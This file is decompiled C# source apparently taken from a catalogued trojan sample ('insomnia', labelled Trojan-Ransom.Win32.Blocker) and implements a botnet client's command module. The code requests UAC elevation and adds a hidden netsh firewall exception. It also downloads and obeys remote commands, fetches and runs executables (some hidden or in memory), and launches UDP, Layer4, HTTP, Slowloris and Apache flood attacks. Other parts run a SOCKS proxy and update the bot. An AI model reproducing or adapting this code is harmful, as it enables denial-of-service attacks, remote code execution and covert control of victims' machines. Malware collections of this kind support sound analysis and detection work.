// Decompiled with JetBrains decompiler
// Type: insomnia.Class33
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace insomnia
{
  internal class Class33
  {
    public static bool Field1;

    public static void Method28()
    {
      if (!(Class39.Method20() == "u") || !Class33.Method27(Class26.Field20))
        return;
      Environment.Exit(-1);
    }

    private static bool Method27(string A_0)
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Verb = "runas";
      startInfo.FileName = A_0;
      try
      {
        Process.Start(startInfo);
        Class31.Method3("Acquired administrative permissions! Restarting...", Class26.Field8);
        return true;
      }
      catch
      {
        Class31.Method3("UAC Elevation request was declined.", Class26.Field8);
      }
      return false;
    }

    public static string Method26() => "[ver='" + Class26.Field17 + "' hash='" + Class26.Field16 + "' proc='" + Class26.Field20 + "' reg='" + Class13.Field5 + "']";

    public static void Method25(string A_0)
    {
      try
      {
        string A_0_1 = new WebClient().DownloadString(A_0);
        Class31.Method3("[READ]: Performing commands from " + A_0, Class31.Field1);
        Class33.Method23(A_0_1);
      }
      catch
      {
      }
    }

    public static void Method24() => Process.Start(new ProcessStartInfo()
    {
      Arguments = "/C netsh firewall add allowedprogram \"" + Class26.Field20 + "\" \"" + Class26.Field5 + "\" ENABLE",
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      FileName = "cmd.exe"
    });

    public static void Method23(string A_0)
    {
      try
      {
        string A_2 = "";
        string A_3 = "";
        string A_4 = "";
        string A_5 = "";
        string[] strArray = Class33.Method4(A_0).Split('|');
        string A_0_1 = Class33.Method4(strArray[0]);
        string str1 = strArray[1];
        if (!(str1 == Class26.Field12))
          return;
        int int32 = Convert.ToInt32(str1.Substring(5, 3));
        string str2 = Class33.Method6(A_0_1, int32).Replace(" .", ".");
        char[] chArray1 = new char[1]{ '|' };
        foreach (string str3 in str2.Split(chArray1))
        {
          char[] chArray2 = new char[1]{ ' ' };
          string[] A_6 = str3.Split(chArray2);
          try
          {
            A_2 = A_6[1];
            A_3 = A_6[2];
            A_4 = A_6[3];
            A_5 = A_6[4];
          }
          catch
          {
          }
          Class31.Method4(A_6[0], Class31.Field1, A_2, A_3, A_4, A_5, A_6);
        }
      }
      catch
      {
      }
    }

    public static void Method22(string A_0, string A_1)
    {
      try
      {
        Process process = new Process();
        if (A_1 == "-h")
        {
          process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
          process.StartInfo.CreateNoWindow = true;
          process.StartInfo.FileName = A_0;
          process.Start();
          Class31.Method3("[OPEN]: " + A_0 + " was opened hidden.", Class31.Field1);
          process.Dispose();
        }
        else
        {
          process.StartInfo.FileName = A_0;
          process.Start();
          Class31.Method3("[OPEN]: " + A_0 + " was opened.", Class31.Field1);
          process.Dispose();
        }
      }
      catch
      {
      }
    }

    public static void Method21(string A_0, string A_1, string A_2)
    {
      try
      {
        Class33.Method16(false);
        Class40.Field8 = A_0;
        Class40.Field6 = Convert.ToInt32(A_1);
        Class40.Field3 = 50;
        Class40.Field2 = 50;
        Class40.Field5 = 128;
        int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
        Class31.Method3("[UDP]: Flooding started on " + A_0 + ":" + A_1 + " for " + A_2 + " seconds.", Class26.Field8);
        Class40.Method2();
        Class40.Field1 = true;
        Thread.Sleep(millisecondsTimeout);
        if (!Class40.Field1)
          return;
        Class33.Method16(false);
        Class31.Method3("[UDP]: Flooding finished on " + A_0 + ":" + A_1, Class26.Field8);
      }
      catch
      {
      }
    }

    public static void Method20(string A_0, string A_1)
    {
      try
      {
        if (!(A_0 != "") || !(A_0 != " ") || A_0 == null)
          return;
        Class33.Method16(false);
        string str = A_0;
        if (!A_0.Contains("http:"))
          str = "http://" + A_0;
        int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
        Class15.Field5 = str;
        Class31.Method3("[LAYER7]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
        Class15.Method2();
        Class15.Field3 = true;
        Thread.Sleep(millisecondsTimeout);
        if (!Class15.Field3)
          return;
        Class33.Method16(false);
        Class31.Method3("[LAYER7]: Flooding finished on " + A_0, Class26.Field8);
      }
      catch
      {
      }
    }

    public static void Method19(string A_0, string A_1, string A_2)
    {
      try
      {
        if (!(A_0 != "") || !(A_0 != " ") || A_0 == null)
          return;
        Class33.Method16(false);
        Class22.Field7 = A_0;
        Class22.Field5 = Convert.ToInt32(A_1);
        Class22.Field2 = 50;
        Class22.Field3 = 50;
        int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
        Class31.Method3("[LAYER4]: Flooding started on " + A_0 + ":" + A_1 + " for " + A_2 + " seconds.", Class26.Field8);
        Class22.Method2();
        Class22.Field1 = true;
        Thread.Sleep(millisecondsTimeout);
        if (!Class22.Field1)
          return;
        Class33.Method16(false);
        Class31.Method3("[LAYER4]: Flooding finished on " + A_0 + ":" + A_1, Class26.Field8);
      }
      catch
      {
      }
    }

    public static void Method18(string A_0, string A_1)
    {
      try
      {
        if (!(A_0 != "") || !(A_0 != " ") || A_0 == null)
          return;
        Class33.Method16(false);
        Class36.Field7 = A_0;
        Class36.Field4 = 80;
        Class36.Field5 = 200;
        int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
        Class31.Method3("[SLOWLORIS]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
        Class36.Method4();
        Class36.Field3 = true;
        Thread.Sleep(millisecondsTimeout);
        if (!Class36.Field3)
          return;
        Class33.Method16(false);
        Class31.Method3("[SLOWLORIS]: Flooding finished on " + A_0, Class26.Field8);
      }
      catch
      {
      }
    }

    public static void Method17(string A_0, string A_1)
    {
      try
      {
        if (!(A_0 != "") || !(A_0 != " ") || A_0 == null)
          return;
        Class33.Method16(false);
        Class20.Field7 = A_0;
        Class20.Field6 = 80;
        Class20.Field5 = 100;
        int millisecondsTimeout = Convert.ToInt32(A_1) * 1000;
        Class31.Method3("[APACHE-RME]: Flooding started on " + A_0 + " for " + A_1 + " seconds.", Class26.Field8);
        Class20.Method3();
        Class20.Field1 = true;
        Thread.Sleep(millisecondsTimeout);
        if (!Class20.Field1)
          return;
        Class33.Method16(false);
        Class31.Method3("[APACHE-RME]: Flooding finished on " + A_0, Class26.Field8);
      }
      catch
      {
      }
    }

    public static void Method16(bool A_0)
    {
      try
      {
        if (Class15.Field3)
        {
          Class15.Method1();
          Class15.Field3 = false;
          if (A_0)
            Class31.Method3("[LAYER7]: Flooding aborted.", Class31.Field1);
        }
        if (Class22.Field1)
        {
          Class22.Method1();
          Class22.Field1 = false;
          if (A_0)
            Class31.Method3("[LAYER4]: Flooding aborted.", Class31.Field1);
        }
        if (Class40.Field1)
        {
          Class40.Method1();
          Class40.Field1 = false;
          if (A_0)
            Class31.Method3("[UDP]: Flooding aborted.", Class31.Field1);
        }
        if (Class36.Field3)
        {
          Class36.Method3();
          Class36.Field3 = false;
          if (A_0)
            Class31.Method3("[SLOWLORIS]: Flooding aborted.", Class31.Field1);
        }
        if (!Class20.Field1)
          return;
        Class20.Method2();
        Class20.Field1 = false;
        if (!A_0)
          return;
        Class31.Method3("[APACHE-RME]: Flooding aborted.", Class31.Field1);
      }
      catch
      {
      }
    }

    public static void Method15()
    {
      try
      {
        Class33.Method24();
      }
      catch
      {
      }
      try
      {
        if (!Class33.Field1)
        {
          Class31.Method3("[SOCKS]: Attempting to start SOCKS server...", Class31.Field1);
          new Thread(new ThreadStart(Class25.Method3))
          {
            IsBackground = true
          }.Start();
          Class33.Field1 = true;
        }
        else
          Class31.Method3(Class25.Field2, Class31.Field1);
      }
      catch
      {
      }
    }

    public static void Method14()
    {
      try
      {
        Class39.Method2("uninstalling");
      }
      catch
      {
      }
    }

    public static void Method13() => new Thread(new ThreadStart(Class27.Method2))
    {
      IsBackground = true
    }.Start();

    public static void Method12() => new Thread(new ThreadStart(Class27.Method1))
    {
      IsBackground = true
    }.Start();

    public static void Method11(string A_0)
    {
      if (A_0 == "-i")
        new Thread(new ThreadStart(Class28.Method1))
        {
          IsBackground = true
        }.Start();
      else
        new Thread(new ThreadStart(Class28.Method5))
        {
          IsBackground = true
        }.Start();
    }

    public static void Method10()
    {
      try
      {
        Class31.Method3("[antivirus='" + Class39.Method9() + "' firewall='" + Class39.Method8() + "']", Class31.Field1);
      }
      catch
      {
      }
    }

    public static void Method9(string A_0)
    {
      try
      {
        if (!(A_0 != ""))
          return;
        string str = "uqcvw" + ".tmp";
        WebClient webClient = new WebClient();
        Stopwatch stopwatch = Stopwatch.StartNew();
        Class31.Method3("[SPEEDTEST]: Starting download on " + A_0, Class31.Field1);
        webClient.DownloadFile(A_0, str);
        stopwatch.Stop();
        FileInfo fileInfo = new FileInfo(str);
        long A_0_1 = fileInfo.Length / (long) stopwatch.Elapsed.Seconds;
        Class31.Method3("[SPEEDTEST]: Download complete. [size='" + Class39.Method7(fileInfo.Length) + "' speed='" + Class39.Method7(A_0_1) + "ps']", Class31.Field1);
        System.IO.File.Delete(str);
      }
      catch
      {
      }
    }

    public static void Method8(string A_0, string A_1)
    {
      if (!(A_0 != ""))
      {
        if (!(A_1 != ""))
          return;
      }
      try
      {
        string str1 = "arsaz" + ".exe";
        new WebClient().DownloadFile(A_0, str1);
        string str2 = Class39.Method15(str1);
        if (Class26.Field16.ToLower() == A_1.ToLower())
          Class31.Method3("[UPDATE]: Bot file is already latest version.", Class31.Field1);
        else if (str2.ToLower() == A_1.ToLower())
        {
          Class31.Method3("[UPDATE]: Bot file updated.", Class31.Field1);
          Process process = new Process();
          process.StartInfo.FileName = str1;
          process.Start();
          process.Dispose();
          Class39.Method2("updating...");
        }
        else
          Class31.Method3("[UPDATE]: MD5 Mismatch ['" + str2.ToLower() + "' != '" + A_1.ToLower() + "']", Class31.Field1);
      }
      catch
      {
      }
    }

    public static void Method7(string A_0, string A_1, string A_2)
    {
      try
      {
        string str1 = Environment.GetEnvironmentVariable("APPDATA") + "\\" + "mndpb" + ".exe";
        new WebClient().DownloadFile(A_0, str1);
        FileInfo fileInfo = new FileInfo(str1);
        if (A_1 == "-t")
        {
          if (A_2 != "")
          {
            try
            {
              string field8 = Class26.Field8;
              int int32 = Convert.ToInt32(A_2);
              int millisecondsTimeout = int32 * 1000 * 60;
              Process process = new Process();
              process.StartInfo.FileName = str1;
              string fullName = fileInfo.FullName;
              process.Start();
              Class31.Method3("Executing file for " + (object) int32 + " minutes [file='" + fileInfo.FullName + "' size='" + (object) fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "']", field8);
              Thread.Sleep(millisecondsTimeout);
              try
              {
                process.Kill();
                Class31.Method3("Removing file [file='" + fileInfo.FullName + "' proc='" + process.ProcessName + "']", field8);
                process.WaitForExit();
                System.IO.File.Delete(fullName);
                return;
              }
              catch
              {
                return;
              }
            }
            catch
            {
              return;
            }
          }
        }
        if (A_1 == "-m")
        {
          if (Class39.Method16(fileInfo.FullName).Contains(".NET"))
          {
            try
            {
              Class39.Method6(fileInfo.FullName);
              Class31.Method3("Executed file into memory [file='" + fileInfo.FullName + "' size='" + (object) fileInfo.Length + " bytes' proc='" + Class26.Field20 + "']", Class31.Field1);
              return;
            }
            catch
            {
              return;
            }
          }
        }
        if (A_1 == "-r")
        {
          try
          {
            Thread thread = new Thread(new ThreadStart(Class19.Method4));
            thread.IsBackground = true;
            thread.Start();
            Process process = new Process();
            process.StartInfo.FileName = str1;
            process.Start();
            Class31.Method3("Executed file with Ruskill [file='" + fileInfo.FullName + "' size='" + (object) fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "' id='" + (object) process.Id + "']", Class31.Field1);
            if (System.IO.File.Exists(str1))
            {
              if (Class35.Method1(str1))
                Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + str1, Class26.Field3);
              else
                Class31.Method3("[RUSKILL]: Will attempt to prevent file from starting next reboot -> " + str1, Class26.Field3);
            }
            string str2 = Class33.Method3(process.ProcessName);
            if (str2 != "")
              Class31.Method3("[RUSKILL]: Outgoing connection detected from " + process.ProcessName + " -> " + str2, Class26.Field8);
            process.Dispose();
            Thread.Sleep(15000);
            thread.Suspend();
          }
          catch
          {
          }
        }
        else
        {
          if (!(A_0 != ""))
            return;
          Process process = new Process();
          process.StartInfo.FileName = str1;
          process.Start();
          Class31.Method3("Executed file [file='" + fileInfo.FullName + "' size='" + (object) fileInfo.Length + " bytes' type='" + Class39.Method16(fileInfo.FullName) + "']", Class31.Field1);
          process.Dispose();
        }
      }
      catch (WebException ex)
      {
        string str = "Could not download the file.";
        if (ex.Message.Contains("404"))
          str = "404 file not found";
        if (ex.Message.Contains("460"))
          str = "460 access restricted";
        Class31.Method3("Error Downloading [" + str + "]", Class31.Field1);
      }
    }

    public static string Method6(string A_0, int A_1)
    {
      StringBuilder stringBuilder1 = new StringBuilder(A_0);
      StringBuilder stringBuilder2 = new StringBuilder(A_0.Length);
      for (int index = 0; index < A_0.Length; ++index)
      {
        char ch = (char) ((uint) stringBuilder1[index] ^ (uint) A_1);
        stringBuilder2.Append(ch);
      }
      return stringBuilder2.ToString();
    }

    public static string Method5(string A_0) => Convert.ToBase64String(Encoding.UTF8.GetBytes(A_0));

    public static string Method4(string A_0) => Encoding.UTF8.GetString(Convert.FromBase64String(A_0));

    public static string Method3(string A_0)
    {
      string str1 = Class33.Method1();
      if (str1 != "error")
      {
        string str2 = str1;
        string[] separator = new string[2]{ "\r\n", "\n" };
        foreach (string input in str2.Split(separator, StringSplitOptions.None))
        {
          if (input.Contains("TCP"))
          {
            string[] strArray = Regex.Split(input, "\\s+");
            if (Process.GetProcessById(Convert.ToInt32(strArray[5])).ProcessName == A_0)
              return strArray[3];
          }
        }
      }
      return "";
    }

    public static string[] Method2() => Class33.Method1().Split(new string[2]
    {
      "\r\n",
      "\n"
    }, StringSplitOptions.None);

    private static string Method1()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = "netstat.exe";
        process.StartInfo.Arguments = "-n -o";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        return process.StandardOutput.ReadToEnd();
      }
      catch
      {
        return "error";
      }
    }
  }
}
